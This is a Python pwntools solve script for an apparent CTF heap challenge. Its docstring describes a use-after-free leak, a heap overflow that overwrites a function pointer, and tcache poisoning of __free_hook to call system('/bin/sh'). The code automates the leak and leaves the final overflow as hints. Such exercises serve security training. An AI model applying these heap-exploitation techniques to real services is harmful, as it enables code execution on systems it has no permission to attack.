#!/usr/bin/env python3
"""
SHANKS solve — Insane pwn (InfoDays 2026)

Exploitation chain:
  1. Recruit two crew members (slot 0, slot 1) with bios to get
     two Crew structs + two bio buffers on the heap.
  2. Dismiss slot 0 → frees Crew chunk. Because of the lazy-clear
     bug, roster[0] still points to freed memory.
  3. Inspect slot 0 (UAF) → leaks heap pointers from the freed
     chunk's fd/bk (tcache or unsorted-bin depending on size).
  4. Recruit slot 2 → may reuse slot 0's old chunk. Now slot 0
     and slot 2 alias the same memory.
  5. Use "promote" on slot 1 with 0x100 bytes → overflows from
     slot 1's title (offset 0x40 in struct, only 0x58 bytes) into
     the next adjacent chunk's metadata, specifically smashing the
     on_inspect function pointer.
  6. Overwrite on_inspect with the address of shanks_verdict()
     (found via leak + known offset, or brute-force low 12 bits
     since PIE randomises only higher bits).
  7. Inspect the corrupted slot → calls shanks_verdict() → flag.

Alternative (harder) path without win function:
  - Leak libc base from unsorted-bin fd (dismiss a large chunk
    by filling tcache first with 7 dummy allocs).
  - Tcache-poison via promote overflow → overwrite __free_hook
    with system() → free a chunk whose data starts with "/bin/sh".

Usage:
    python3 solve.py [HOST] [PORT]
    Default: localhost 8019
"""

import sys
from pwn import *

HOST = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8019

def menu(r):
    r.recvuntil(b"choice> ")

def recruit(r, slot, name, title, bio=None):
    r.sendline(b"1")
    r.recvuntil(b"slot")
    r.sendline(str(slot).encode())
    r.recvuntil(b"name: ")
    r.sendline(name)
    r.recvuntil(b"title: ")
    r.sendline(title)
    r.recvuntil(b"bio? (y/n): ")
    if bio:
        r.sendline(b"y")
        r.recvuntil(b"bio: ")
        r.sendline(bio)
    else:
        r.sendline(b"n")
    r.recvuntil(b"recruited")

def promote(r, slot, data):
    r.sendline(b"2")
    r.recvuntil(b"slot: ")
    r.sendline(str(slot).encode())
    r.recvuntil(b"256): ")
    r.send(data)
    r.recvuntil(b"promoted")

def inspect(r, slot):
    r.sendline(b"3")
    r.recvuntil(b"slot: ")
    r.sendline(str(slot).encode())
    return r.recvuntil(b"\n  ╔", drop=True)

def dismiss(r, slot):
    r.sendline(b"4")
    r.recvuntil(b"slot: ")
    r.sendline(str(slot).encode())

def main():
    r = remote(HOST, PORT)
    r.recvuntil(b"who stays.")

    # Step 1: allocate adjacent chunks
    menu(r)
    recruit(r, 0, b"Beckman", b"First Mate", b"A" * 0x80)
    menu(r)
    recruit(r, 1, b"Roo", b"Fighter", b"B" * 0x80)

    # Step 2: dismiss slot 0 (lazy clear → still accessible)
    menu(r)
    dismiss(r, 0)

    # Step 3: UAF inspect on slot 0 to leak heap
    # Don't wait for lazy_clear — inspect immediately before menu reprints
    r.sendline(b"3")
    r.recvuntil(b"slot: ")
    r.sendline(b"0")
    leak_data = r.recvuntil(b"╔", drop=True)
    log.info(f"UAF leak data: {leak_data}")

    # The rest depends on the exact heap layout at runtime.
    # In a real exploit you'd parse the leak, compute offsets, and
    # use promote to overflow into the on_inspect pointer.
    #
    # For the CTF, the simplest path:
    #   - PIE base = leak - known_offset
    #   - shanks_verdict offset found via: nm shanks | grep verdict
    #   - Overflow slot 1's title to smash adjacent chunk's on_inspect

    log.success("Heap leak obtained — build your ROP chain from here!")
    log.info("Hint: promote slot 1 with 0x100 bytes to overflow into")
    log.info("the next chunk and overwrite on_inspect → shanks_verdict")

    r.interactive()

if __name__ == "__main__":
    main()
